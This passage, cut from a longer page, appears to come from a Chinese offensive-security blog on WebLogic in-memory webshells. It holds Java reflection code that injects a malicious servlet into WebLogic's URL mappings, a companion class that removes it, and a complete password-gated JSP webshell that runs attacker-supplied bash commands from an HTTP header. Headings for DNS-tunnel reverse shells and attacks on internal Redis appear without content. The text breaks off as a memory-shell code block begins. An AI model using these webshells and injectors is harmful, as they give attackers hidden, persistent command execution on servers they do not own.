</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 使用ServletStub包装HttpServlet
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Constructor<span style=color:#f92672>&lt;?&gt;</span> ServletStubImplConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.ServletStubImpl&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Servlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> WebAppServletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletStubImpl servletStub <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletStubImpl<span style=color:#f92672>)</span> ServletStubImplConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> httpServlet<span style=color:#f92672>,</span> servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 使用URLMathchHelper包装ServletStub
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Constructor<span style=color:#f92672>&lt;?&gt;</span> URLMatchHelperConstructor <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;weblogic.servlet.internal.URLMatchHelper&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> ServletStubImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            Object umh <span style=color:#f92672>=</span> URLMatchHelperConstructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> servletStub<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ServletResponseImpl resp <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            ServletOutputStreamImpl sos <span style=color:#f92672>=</span> resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 添加到ServletMapping中，即代表注入servlet内存马成功
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>,</span> umh<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;==\n&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=参考阅读>参考阅读<a hidden class=anchor aria-hidden=true href=#参考阅读>#</a></h3><ul><li><a href=https://www.cnblogs.com/bitterz/p/14970230.html>Weblogic下的servlet内存马注入-无参照纯调试</a></li><li><a href=https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/#%E8%8E%B7%E5%8F%96webappservletcontext>Weblogic-内存马分析与实现</a></li><li><a href=https://www.xuxblog.top/archives/java-dong-tai-jia-zai-zi-jie-ma-de-fang-fa>Java动态加载字节码的方法</a></li></ul><h2 id=memsdjava卸载内存马>memsd.java：卸载内存马<a hidden class=anchor aria-hidden=true href=#memsdjava卸载内存马>#</a></h2><h3 id=注意点-2>注意点<a hidden class=anchor aria-hidden=true href=#注意点-2>#</a></h3><ol><li>因为我们在加载自定义httpservlet字节码的时候做了try catch处理，所以可以任意卸载内存马并重新加载。否则的话卸载后需要给httpservlet换一个类名才能加载。</li><li>所谓卸载只是将路由去掉，内存中还是存在恶意类的。需要重启JVM才能完全清理。</li></ol><h3 id=最终效果-7>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-7>#</a></h3><p><img loading=lazy src=image-20220704174306916.png alt=image-20220704174306916></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-117-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-117-45>45</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.utils.ServletMapping<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Method<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsd</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>memsd</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String URI <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/pages/css/bluecameby1&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 获取servletContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            WebAppServletContext servletContext <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 获取servletMapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            Method getServletMapping <span style=color:#f92672>=</span> servletContext<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getServletMapping&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletMapping mappings <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ServletMapping<span style=color:#f92672>)</span> getServletMapping<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>servletContext<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            ServletResponseImpl resp <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            ServletOutputStreamImpl sos <span style=color:#f92672>=</span> resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//delete pattern from mapping
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>)</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>removePattern</span><span style=color:#f92672>(</span>URI<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;==\n&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>valueOf</span><span style=color:#f92672>(</span>mappings<span style=color:#f92672>.</span><span style=color:#a6e22e>size</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=无回显执行命令>无回显执行命令<a hidden class=anchor aria-hidden=true href=#无回显执行命令>#</a></h3><h3 id=回显执行命令>回显执行命令<a hidden class=anchor aria-hidden=true href=#回显执行命令>#</a></h3><h3 id=注入内存马>注入内存马<a hidden class=anchor aria-hidden=true href=#注入内存马>#</a></h3><h3 id=卸载更新内存马>卸载/更新内存马<a hidden class=anchor aria-hidden=true href=#卸载更新内存马>#</a></h3><h3 id=机器不出网时复用dns隧道反弹shell>机器不出网时复用DNS隧道反弹shell<a hidden class=anchor aria-hidden=true href=#机器不出网时复用dns隧道反弹shell>#</a></h3><h3 id=横向攻击内网redis>横向攻击内网Redis<a hidden class=anchor aria-hidden=true href=#横向攻击内网redis>#</a></h3><h2 id=一些木马>一些木马<a hidden class=anchor aria-hidden=true href=#一些木马>#</a></h2><h3 id=普通jsp木马>普通JSP木马<a hidden class=anchor aria-hidden=true href=#普通jsp木马>#</a></h3><p>通过请求头传递密码和命令，通过响应打印命令执行的结果。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-118-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-118-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;% if(&#34;p4ssw0rd!&#34;.equals(request.getHeader(&#34;x-forwarded-fur&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(new String[]{&#34;bash&#34;,&#34;-c&#34;,request.getHeader(&#34;x-forwarded-far&#34;)}).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&#34;&lt;pre&gt;&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&#34;&lt;/pre&gt;&#34;); } %&gt;
</span></span></code></pre></td></tr></table></div></div><h3 id=加密流量jsp木马>加密流量JSP木马<a hidden class=anchor aria-hidden=true href=#加密流量jsp木马>#</a></h3><p>待需要时实现。思路很简单，只要将异或、base64编码、rot13、AES加密等的进行排列组合即可。</p><h3 id=普通内存马>普通内存马<a hidden class=anchor aria-hidden=true href=#普通内存马>#</a></h3><p>通过请求头传递密码和命令，通过响应打印命令执行的结果。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-6> 6</a>
